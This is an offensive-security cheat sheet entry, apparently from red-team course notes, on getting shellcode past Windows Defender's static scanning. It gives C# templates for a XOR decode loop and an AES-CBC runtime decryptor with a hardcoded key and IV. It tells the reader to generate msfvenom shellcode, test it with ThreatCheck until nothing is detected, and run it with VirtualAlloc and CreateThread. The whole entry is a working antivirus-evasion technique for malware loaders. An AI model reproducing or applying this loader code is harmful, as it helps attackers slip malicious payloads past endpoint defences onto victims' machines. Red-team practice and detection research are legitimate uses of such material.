# 16.20 XOR AES Shellcode Encryption

> AES-CBC-encrypt shellcode in CyberChef and decrypt at runtime — single-byte XOR (0x5C) alone won't bypass Defender static signatures.

## Overview

Encrypt shellcode to bypass static signature detection. XOR (key 0x5C) alone is insufficient against Defender — AES-CBC is needed. Encrypt in CyberChef, decrypt at runtime before calling VirtualAlloc.

## Steps

- **XOR 0x5C** — simple byte loop; caught by Defender (shown for comparison only).
- **AES-CBC** — use CyberChef to encrypt; decrypt at runtime with Aes.Create() + ICryptoTransform.
- Store ciphertext as Base64 string literal in the source file.
- Run ThreatCheck after each attempt: `No threat found!` = success.

## Commands

### XOR decrypt loop (insufficient — Defender still detects)

```csharp
// XOR'd shellcode — simple loop decrypts before VirtualAlloc
// ─── PASTE XOR'd SHELLCODE HERE ──────────────────────────────────────────────
// Generate: msfvenom ... -f csharp | python xor_encode.py  (XOR key 0x5c each byte)
byte[] buf = new byte[] { <XOR'd shellcode> };  // ← paste XOR-encoded bytes here
int i = 0;
while (i < buf.Length)
{
    buf[i] = (byte)(buf[i] ^ 0x5c);
    i++;
}
```

### AES-CBC decrypt (bypasses Defender static scan)

```csharp
using System.Security.Cryptography;
// ...
// ─── PASTE AES-ENCRYPTED SHELLCODE HERE ──────────────────────────────────────
// 1. Generate raw shellcode (msfvenom/micr0_shell -f raw)
// 2. AES-CBC encrypt with the key/iv below, then Base64-encode the ciphertext
// 3. Paste the resulting Base64 string here:
string bufEnc = "<Base64-AES-ciphertext>";  // ← paste Base64(AES(shellcode)) here
Aes aes = Aes.Create();
byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
byte[] iv  = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
byte[] buf;
using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
using (var msPlain = new System.IO.MemoryStream())
{
    csDecrypt.CopyTo(msPlain);
    buf = msPlain.ToArray();
}
// then proceed with VirtualAlloc + CreateThread as before
```
